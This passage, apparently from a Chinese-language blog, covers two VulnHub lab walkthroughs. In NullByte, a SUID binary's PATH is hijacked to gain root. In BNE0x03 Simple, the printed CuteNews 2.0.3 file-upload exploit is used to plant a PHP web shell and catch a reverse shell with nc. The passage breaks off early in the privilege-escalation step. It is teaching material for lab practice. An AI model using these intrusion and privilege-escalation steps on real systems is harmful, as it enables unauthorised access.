class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE-&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>c6d6bd7ebf806f43c76acc3681703b81base64: invalid input<br></code></pre></td></tr></table></figure><p>看起来还是一层加密</p><p><img src="/pic/dca22fa6361b6f120af4c63776335fb7_MD5.png"></p><p>找一找 hash 破解工具</p><p><img src="/pic/0c3f1fee46eb54e9cd3f53fe0f34f4e4_MD5.png"></p><p>得到了密码，和之前的用户名一起，尝试 ssh 登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Nullbyte]<br>└─$ ssh ramses@192.168.56.108 -p777<br>ramses@192.168.56.108\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109</span><br><span class="hljs-string">ramses@NullByte:~$ whoami</span><br><span class="hljs-string">ramses</span><br><span class="hljs-string">ramses@NullByte:~$ id</span><br><span class="hljs-string">uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)</span><br><span class="hljs-string">ramses@NullByte:~$ uname -a</span><br><span class="hljs-string">Linux NullByte 3.16.0-4-686-pae #1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17) i686 GNU/Linux</span><br><span class="hljs-string">ramses@NullByte:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default </span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:1c:0d:6f brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.108/24 brd 192.168.56.255 scope global eth0</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 fe80::a00:27ff:fe1c:d6f/64 scope link </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">ramses@NullByte:~$ sudo -l</span><br><span class="hljs-string">[sudo] password for ramses: </span><br><span class="hljs-string">Sorry, user ramses may not run sudo on NullByte.</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看 s 权限的时候发现一个特殊文件，位于 backup 目录中</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs shell">ramses@NullByte:/home$ find / -type f -perm -04000 -ls 2&gt;/dev/null<br>273365  552 -rwsr-xr-x   1 root     root       562536 Mar 23  2015 /usr/lib/openssh/ssh-keysign<br>274287   16 -rwsr-xr-x   1 root     root        13796 Nov 28  2014 /usr/lib/policykit-1/polkit-agent-helper-1<br>267213    8 -rwsr-xr-x   1 root     root         5372 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>261444   12 -rwsr-xr-x   1 root     root         9540 Apr 15  2015 /usr/lib/pt_chown<br>271482  356 -rwsr-xr--   1 root     messagebus   362672 May 28  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>273383   96 -rwsr-sr-x   1 root     mail        96192 Feb 12  2015 /usr/bin/procmail<br>272955   52 -rwsr-sr-x   1 daemon   daemon      50644 Sep 30  2014 /usr/bin/at<br>265920   52 -rwsr-xr-x   1 root     root        52344 Nov 20  2014 /usr/bin/chfn<br>263697   40 -rwsr-xr-x   1 root     root        38740 Nov 20  2014 /usr/bin/newgrp<br>265925   44 -rwsr-xr-x   1 root     root        43576 Nov 20  2014 /usr/bin/chsh<br>265924   80 -rwsr-xr-x   1 root     root        78072 Nov 20  2014 /usr/bin/gpasswd<br>274292   20 -rwsr-xr-x   1 root     root        18064 Nov 28  2014 /usr/bin/pkexec<br>265921   52 -rwsr-xr-x   1 root     root        53112 Nov 20  2014 /usr/bin/passwd<br>278443  176 -rwsr-xr-x   1 root     root       176400 Mar 12  2015 /usr/bin/sudo<br>273033 1056 -rwsr-xr-x   1 root     root      1081076 Feb 18  2015 /usr/sbin/exim4<br>391947    8 -rwsr-xr-x   1 root     root         4932 Aug  2  2015 /var/www/backup/procwatch<br>519235   40 -rwsr-xr-x   1 root     root        38868 Nov 20  2014 /bin/su<br>519210   36 -rwsr-xr-x   1 root     root        34684 Mar 30  2015 /bin/mount<br>519212   28 -rwsr-xr-x   1 root     root        26344 Mar 30  2015 /bin/umount<br>   149   96 -rwsr-xr-x   1 root     root        96760 Aug 13  2014 /sbin/mount.nfs<br><br></code></pre></td></tr></table></figure><p>cat 去查看&#x2F;var&#x2F; www&#x2F;backup&#x2F;procwatch 文件，似乎是 gcc 编译后得到的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ramses@NullByte:/home$ <span class="hljs-built_in">ls</span> -liah /var/www/backup/procwatch<br>391947 -rwsr-xr-x 1 root root 4.9K Aug  2  2015 /var/www/backup/procwatch<br></code></pre></td></tr></table></figure><p>运行一下试试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">ramses@NullByte:/var/www/backup$ /var/www/backup/procwatch<br>  PID TTY          TIME CMD<br> 1485 pts/0    00:00:00 procwatch<br> 1486 pts/0    00:00:00 sh<br> 1487 pts/0    00:00:00 ps<br></code></pre></td></tr></table></figure><p>似乎是调用了 sh 和 ps，这里的提权方法需要记忆一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs shell">ramses@NullByte:/var/www/backup$ ln -s /bin/sh ps<br>ramses@NullByte:/var/www/backup$ export PATH=.:$PATH<br>ramses@NullByte:/var/www/backup$ ./procwatch <br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">whoami</span></span><br>root<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">id</span></span><br>uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cd</span> /root</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br>proof.txt<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> pro</span>  <br>cat: pro: No such file or directory<br><span class="hljs-meta prompt_"># </span><span class="language-bash"><span class="hljs-built_in">cat</span> proof.txt</span><br>adf11c7a9e6523e630aaf3b9b7acb51d<br><br>It seems that you have pwned the box, congrats. <br>Now you done that I wanna talk with you. Write a walk &amp; mail at<br>xly0n@sigaint.org attach the walk and proof.txt<br>If sigaint.org is down you may mail at nbsly0n@gmail.com<br><br><br>USE THIS PGP PUBLIC KEY<br><br>-----BEGIN PGP PUBLIC KEY BLOCK-----<br>Version: BCPG C# v1.6.1.0<br><br>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ<br>Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT<br>e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq<br>Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK<br>+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe<br>YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu<br>Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS<br>HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q<br>m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn<br>XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58<br>kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8<br>TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU<br>Gms=<br>=PiAQ<br>-----END PGP PUBLIC KEY BLOCK-----<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>vulnhub</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BNE0x03Simple靶机</title>
    <link href="/2023/05/877acee13580.html"/>
    <url>/2023/05/877acee13580.html</url>
    
    <content type="html"><![CDATA[<h1 id="BNE0x03Simple-靶机"><a href="#BNE0x03Simple-靶机" class="headerlink" title="BNE0x03Simple 靶机"></a>BNE0x03Simple 靶机</h1><blockquote><p>CuteCMS2.0.3公开漏洞利用，超贴心的利用文件，将标准化的挖洞和渗透过程，几乎以手把手的方式教给你。内核提权本次靶机演示遇到了很多问题，小小的翻车现场，也是真实渗透内核提权过程的展现，面对现实，汲取教训。很容易的一台机器，但也很有思考的价值。</p></blockquote><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.104<br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-26 22:32 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.000093s latency).<br>Not shown: 65534 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>80/tcp open  http<br>MAC Address: 08:00:27:72:6C:8B (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.83 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p80 192.168.56.104 <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-26 22:34 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.00036s latency).<br><br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br>|_http-title: Please Login / CuteNews<br>|_http-server-header: Apache/2.4.7 (Ubuntu)<br>MAC Address: 08:00:27:72:6C:8B (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.14 seconds<br><br>┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p80 192.168.56.104  <br>Starting Nmap 7.92 ( https://nmap.org ) at 2023-05-26 22:42 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.104<br>Host is up (0.00031s latency).<br><br>PORT   STATE SERVICE<br>80/tcp open  http<br>| http-slowloris-check: <br>|   VULNERABLE:<br>|   Slowloris DOS attack<br>|     State: LIKELY VULNERABLE<br>|     IDs:  CVE:CVE-2007-6750<br>|       Slowloris tries to keep many connections to the target web server open and hold<br>|       them open as long as possible.  It accomplishes this by opening connections to<br>|       the target web server and sending a partial request. By doing so, it starves<br>|       the http server<span class="hljs-string">&#x27;s resources causing Denial Of Service.</span><br><span class="hljs-string">|       </span><br><span class="hljs-string">|     Disclosure date: 2009-09-17</span><br><span class="hljs-string">|     References:</span><br><span class="hljs-string">|       http://ha.ckers.org/slowloris/</span><br><span class="hljs-string">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|_  /rss.php: RSS or Atom feed</span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>| http-csrf: <br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.56.104<br>|   Found the following possible CSRF vulnerabilities: <br>|     <br>|     Path: http://192.168.56.104:80/<br>|     Form <span class="hljs-built_in">id</span>: login_form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.104:80/?register<br>|     Form <span class="hljs-built_in">id</span>: regpassword<br>|     Form action: /index.php?register<br>|     <br>|     Path: http://192.168.56.104:80/?register&amp;lostpass<br>|     Form <span class="hljs-built_in">id</span>: <br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.104:80/index.php<br>|     Form <span class="hljs-built_in">id</span>: login_form<br>|     Form action: /index.php<br>|     <br>|     Path: http://192.168.56.104:80/index.php?register<br>|     Form <span class="hljs-built_in">id</span>: regpassword<br>|_    Form action: /index.php?register<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">MAC Address: 08:00:27:72:6C:8B (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 321.44 seconds</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><h2 id="Web-界面查看"><a href="#Web-界面查看" class="headerlink" title="Web 界面查看"></a>Web 界面查看</h2><p>发现是一个登录界面，包含了版本号和产品名，尝试使用 searchsploit 来搜索漏洞</p><p><img src="/pic/668cfbf996163457d0baf262e9ba6d46_MD5.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ searchsploit CuteNews 2.0                             <br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                                                                                                                            |  Path<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>CuteNews 2.0.3 - Arbitrary File Upload                                                                                                                                                                    | php/webapps/37474.txt<br>---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br></code></pre></td></tr></table></figure><p>下载文件到本地，查看内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ searchsploit -m 37474<br>  Exploit: CuteNews 2.0.3 - Arbitrary File Upload<br>      URL: https://www.exploit-db.com/exploits/37474<br>     Path: /usr/share/exploitdb/exploits/php/webapps/37474.txt<br>File Type: ASCII text<br><br>Copied to: /home/kali/37474.txt<br><br><br><br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">cat</span> 37474.txt <br>          CuteNews 2.0.3 Remote File Upload Vulnerability<br>        =================================================<br>1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0<br>0     _                   __           __       __                     1<br>1   /<span class="hljs-string">&#x27; \            __  /&#x27;</span>__`\        /\ \__  /<span class="hljs-string">&#x27;__`\                   0</span><br><span class="hljs-string">0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1</span><br><span class="hljs-string">1  \/_/\ \ /&#x27;</span> _ `\ \/\ \/_/_\_&lt;_  /<span class="hljs-string">&#x27;___\ \ \/\ \ \ \ \/\`&#x27;</span>__\          0<br>0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1<br>1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0<br>0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1<br>1                  \ \____/ &gt;&gt; Exploit database separated by exploit   0<br>0                   \/___/          <span class="hljs-built_in">type</span> (<span class="hljs-built_in">local</span>, remote, DoS, etc.)    1<br>1                                                                      1<br>0  [+] Site            : Inj3ct0r.com                                  0<br>1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1<br>0                                                                      0<br>1               <span class="hljs-comment">##########################################             1</span><br>0               I\<span class="hljs-string">&#x27;m T0x!c member from Inj3ct0r Team             1</span><br><span class="hljs-string">1               ##########################################             0</span><br><span class="hljs-string">0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"># Exploit Title: CuteNews 2.0.3 Remote File Upload Vulnerability</span><br><span class="hljs-string"># Date: [02/07/2015]</span><br><span class="hljs-string"># Exploit Author: [T0x!c]</span><br><span class="hljs-string"># Facebook: https://www.facebook.com/Dz.pr0s</span><br><span class="hljs-string"># Vendor Homepage: [http://cutephp.com/]</span><br><span class="hljs-string"># Software Link: [http://cutephp.com/cutenews/cutenews.2.0.3.zip]</span><br><span class="hljs-string"># Version: [2.0.3]</span><br><span class="hljs-string"># Tested on: [Windows 7]</span><br><span class="hljs-string"># greetz to :Tr00n , Kha&amp;mix , Cc0de  , Ghosty , Ked ans , Caddy-dz .....</span><br><span class="hljs-string">==========================================================</span><br><span class="hljs-string"> # Exploit  :</span><br><span class="hljs-string"></span><br><span class="hljs-string">Vuln : http://127.0.0.1/cutenews/index.php?mod=main&amp;opt=personal</span><br><span class="hljs-string"></span><br><span class="hljs-string"> 1 - Sign up for New User</span><br><span class="hljs-string"> 2 - Log In</span><br><span class="hljs-string"> 3 - Go to Personal options http://www.target.com/cutenews/index.php?mod=main&amp;opt=personal</span><br><span class="hljs-string"> 4 - Select Upload Avatar Example: Evil.jpg</span><br><span class="hljs-string"> 5 - use tamper data  &amp; Rename File Evil.jpg to Evil.php</span><br><span class="hljs-string"></span><br><span class="hljs-string">-----------------------------2847913122899\r\nContent-Disposition: form-data; name=&quot;avatar_file&quot;; filename=&quot;Evil.php&quot;\r\</span><br><span class="hljs-string"></span><br><span class="hljs-string">6 - Your Shell : http://127.0.0.1/cutenews/uploads/avatar_Username_FileName.php</span><br><span class="hljs-string"></span><br><span class="hljs-string"> Example: http://127.0.0.1/cutenews/uploads/avatar_toxic_Evil.php</span><br></code></pre></td></tr></table></figure><h2 id="CuteCMS2-0-3-文件上传漏洞"><a href="#CuteCMS2-0-3-文件上传漏洞" class="headerlink" title="CuteCMS2.0.3 文件上传漏洞"></a>CuteCMS2.0.3 文件上传漏洞</h2><p>得到了非常详细的利用过程，我们按照提示来上传文件，我们使用 burpsuite 来实现对上传文件内容的修改</p><p><img src="/pic/c081ba1c56f571d5055984e086b78576_MD5.png"></p><p>200 上传成功，我们进入 uploads 目录试试</p><p><img src="/pic/428e4a66f7a28d9595259847a96671f4_MD5.png"></p><p>看来上传成功了，而且和漏洞文件里的提示是一致的，接下来我们开启监听，然后访问此 php 文件，反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 443                                     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.104] 46398<br>Linux simple 3.16.0-30-generic <span class="hljs-comment">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 athlon i686 GNU/Linux</span><br> 22:51:10 up 20 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.01, 0.05<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>/bin/sh: 0: can\<span class="hljs-string">&#x27;t access tty; job control turned off</span><br><span class="hljs-string">$</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h2 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@simple:/$ <span class="hljs-built_in">uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux simple 3.16.0-30-generic <span class="hljs-comment">#40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 athlon i686 GNU/Linux</span><br>www-data@simple:/$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@simple:/$ <span class="hljs-built_in">id</span><br><span class="hljs-built_in">id</span><br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>www-data@simple:/$ sudo -l<br>sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>sudo: 3 incorrect password attempts<br></code></pre></td></tr></table></figure><p>没收获，不过内核版本号和操作系统的信息拿到了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 